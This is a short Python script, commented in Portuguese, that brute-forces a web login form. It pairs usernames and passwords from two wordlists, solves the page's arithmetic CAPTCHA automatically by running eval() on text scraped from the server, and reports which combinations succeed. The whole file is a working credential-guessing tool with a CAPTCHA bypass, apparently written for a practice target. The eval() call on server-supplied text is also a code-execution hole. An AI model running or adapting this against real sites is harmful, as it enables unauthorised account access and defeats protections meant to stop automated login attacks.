import requests
import re

# URL_do_host - endereço completo por exemplo do formulario de login
url = "URL_do_host"

# 6i3lpc760hvs77d6vhhn3vq1tb - cookie aleatório que criei
cookies = {'PHPSESSID': '6i3lpc760hvs77d6vhhn3vq1tb'}
data= {"username": "", "password": "", "captcha": ""}

# pega tudo da tag HTML, onde a mensagem que é passada como erro
rg_err = re.compile(r'<p style="color:red" >.*</p>')

# equação a + b
rg_calc = re.compile(r'\d+\s+[\+-x]\s+\d+')

# users.txt é o local do arquivo de usuários.txt que será lido
with open("users.txt") as users: 
    while user := users.readline():
        # password.txt é o local do arquivo de senhas.txt que será lido
        with open("passwords.txt") as passwords:
            while password := passwords.readline():

                req = requests.get(url, cookies=cookies)

                html = req.text

                calc = rg_calc.findall(html)[0].replace('x', '*')

                res = str(eval(calc))

                data["username"] = user.strip()
                data["password"] = password.strip()
                data["captcha"] = res

                post_response = requests.post(url=url, cookies=cookies, data=data)

                if(post_response.history):
                    res_post = "Sucesso"
                else:
                    res_post = rg_err.findall(post_response.text)[0].replace('<p style="color:red" >', '').replace('</p>', '')

                print(data["username"] + " - " + data["password"] + " - " + res_post)